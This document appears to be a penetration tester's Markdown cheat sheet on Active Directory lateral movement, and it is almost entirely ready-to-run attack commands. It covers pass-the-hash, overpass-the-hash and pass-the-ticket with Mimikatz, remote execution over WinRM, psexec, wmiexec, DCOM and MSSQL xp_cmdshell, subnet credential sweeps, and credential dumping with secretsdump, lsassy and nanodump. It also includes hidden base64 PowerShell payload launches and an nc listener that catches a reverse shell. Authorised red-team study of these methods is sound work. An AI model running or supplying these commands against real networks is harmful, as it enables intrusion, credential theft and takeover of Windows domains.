---
title: AD Lateral Movement
type: note
tab: Active Directory
inputs: [Username, Password, Hash, TGT, Shell]
outputs: [Shell, Hash, Credentials]
tags: [ActiveDirectory, Windows, LateralMovement, SMB, NTLM, Kerberos]
---

# AD Lateral Movement

## WHY

Use valid creds/hash/tickets to reach more hosts, dump more creds, and move toward DA.

## WHEN

- Creds or hash may be local admin somewhere.
- WinRM/SMB is open.
- BloodHound shows admin rights or sessions.

## NEXT

- Got shell/local admin: dump creds.
- Found path to DA: [[Privesc]]

## Commands

### WinRM

#Username #Password #Windows #ActiveDirectory #LateralMovement
Test WinRM access.

```sh
nxc winrm <TARGET_IP> -u <USER> -p '<PASS>'
```

#Username #Password #Windows #ActiveDirectory #LateralMovement
Connect with Evil-WinRM.

```sh
evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'
```

#Username #Password #SMB #Windows #ActiveDirectory #LateralMovement
Use psexec with plaintext credentials when admin access is available.

```sh
impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>
```

#Username #Password #Windows #ActiveDirectory #LateralMovement
Create a credential object and open an interactive PowerShell remoting session.

```powershell
$username = '<USER>'
$password = '<PASS>'
$secureString = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString
New-PSSession -ComputerName <TARGET_HOST> -Credential $credential
Enter-PSSession 1
```

#Username #Password #Windows #ActiveDirectory #LateralMovement
Use `winrs` for a simple remote shell or command execution over WinRM.

```cmd
winrs -r:<TARGET_HOST> -u:<USER> -p:<PASS> cmd
winrs -r:<TARGET_HOST> -u:<USER> -p:<PASS> "cmd /c hostname & whoami"
winrs -r:<TARGET_HOST> -u:<USER> -p:<PASS> "powershell -nop -w hidden -e <BASE64_PAYLOAD>"
```

### Pass The Hash

#Username #Hash #SMB #NTLM #Windows #ActiveDirectory #LateralMovement
Test NTLM hash over SMB.

```sh
nxc smb <TARGET_IP> -u <USER> -H <NTLM_HASH>
```

#Username #Hash #SMB #NTLM #Windows #ActiveDirectory #LateralMovement
Execute command with hash.

```sh
impacket-psexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>
```

#Username #Hash #SMB #NTLM #Windows #ActiveDirectory #LateralMovement
Get shell with wmiexec.

```sh
impacket-wmiexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>
```

### Overpass The Hash / Pass The Key

#Username #Hash #Kerberos #Windows #ActiveDirectory #LateralMovement
Create Kerberos logon session with Mimikatz.

```powershell
mimikatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:cmd.exe"
```

#Username #Hash #Kerberos #ActiveDirectory #LateralMovement
Get TGT with NTLM hash.

```sh
impacket-getTGT <DOMAIN>/<USER> -hashes :<NTLM_HASH>
```

#Username #Hash #Kerberos #Windows #ActiveDirectory #LateralMovement
Use Mimikatz overpass-the-hash to spawn a Kerberos-capable PowerShell session, then reach another host.

```powershell
# Target Windows shell: create a new logon session from an NTLM hash.
mimikatz.exe
privilege::debug
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:powershell

# New PowerShell/CMD: force Kerberos use and confirm tickets.
klist
net use \\<TARGET_HOST>\IPC$
klist

# Move laterally if the user has rights.
cd C:\Tools\SysInternalSuite
.\PsExec.exe \\<TARGET_HOST> cmd
```

### Pass The Ticket

#TGT #Kerberos #Windows #ActiveDirectory #LateralMovement
Export Kerberos tickets with Mimikatz, inject the useful CIFS ticket, and access the target share.

```powershell
# Target Windows shell: export available tickets.
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
exit

# Target Windows shell: find the CIFS ticket for the target host.
dir *.kirbi

# Target Windows shell: inject the ticket and confirm access.
mimikatz.exe
privilege::debug
kerberos::ptt <TICKET_FILE>.kirbi
exit
klist
dir \\<TARGET_HOST>\backup
```

### DCOM MMC20 Execution

#Shell #Windows #ActiveDirectory #LateralMovement
Use the MMC20 DCOM object for remote command execution when you have the needed privileges.

```powershell
# Attacker: catch the callback.
nc -lvnp <LPORT>

# Target PowerShell: create a remote MMC20 object and execute a payload.
powershell -ep bypass
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1", "<TARGET_IP>"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell", $null, "-e <BASE64_PAYLOAD>", "7")
```

### MSSQL xp_cmdshell

#Username #Password #Windows #ActiveDirectory #LateralMovement
Use MSSQL admin access to enable `xp_cmdshell`, run commands, and execute a payload.

```sh
# Attacker: connect with Windows authentication.
impacket-mssqlclient '<DOMAIN>/<USER>:<PASS>'@<MSSQL_HOST> -windows-auth

# MSSQL: enable xp_cmdshell and run commands.
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
EXECUTE xp_cmdshell 'whoami /priv';
EXECUTE xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';
```

### Subnet Reuse / Admin Checks

#Username #Password #SMB #Windows #ActiveDirectory #LateralMovement
Sweep a subnet with plaintext credentials and test domain or local auth.

```sh
nxc smb <TARGET_SUBNET> -u <USER> -p '<PASS>'
nxc smb <TARGET_SUBNET> -u <USER> -p '<PASS>' --local-auth
```

#Username #Hash #SMB #NTLM #Windows #ActiveDirectory #LateralMovement
Sweep a subnet with an NTLM hash and test domain or local auth.

```sh
nxc smb <TARGET_SUBNET> -u <USER> -H <NTLM_HASH>
nxc smb <TARGET_SUBNET> -u <USER> -H <NTLM_HASH> --local-auth
```

### RDP

#Username #Password #Windows #ActiveDirectory #LateralMovement
Check whether RDP is enabled and the credential is accepted.

```sh
nxc rdp <TARGET_IP> -u <USER> -p '<PASS>'
```

#Username #Password #SMB #Windows #ActiveDirectory #LateralMovement
Enable RDP with NetExec when you already have admin rights.

```sh
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M rdp -o ACTION=enable
```

### Credential Dumping After Local Admin

#Username #Password #SMB #NTLM #Windows #ActiveDirectory #CredentialDumping
Dump local secrets remotely.

```sh
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<TARGET_IP>
```

#Username #Hash #SMB #NTLM #Windows #ActiveDirectory #CredentialDumping
Dump local secrets remotely with an NTLM hash.

```sh
impacket-secretsdump <USER>@<TARGET_IP> -hashes :<NTLM_HASH>
```

#Username #Password #SMB #NTLM #Windows #ActiveDirectory #CredentialDumping
Dump with lsassy.

```sh
lsassy -d <DOMAIN> -u <USER> -p '<PASS>' <TARGET_IP>
```

#Username #Password #SMB #NTLM #Windows #ActiveDirectory #CredentialDumping
Dump SAM with NetExec.

```sh
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --sam
```

#Username #Password #SMB #NTLM #Windows #ActiveDirectory #CredentialDumping
Dump credentials with NetExec modules after confirming admin access.

```sh
nxc smb <TARGET_SUBNET> -u <USER> -p '<PASS>' -M lsassy
nxc smb <TARGET_SUBNET> -u <USER> -p '<PASS>' -M nanodump
```

## Gotchas

- Local admin on one box often leads to more hashes and more lateral paths.
- WinRM shell is clean and comfortable when enabled.
- Pass-the-hash does not need plaintext password.
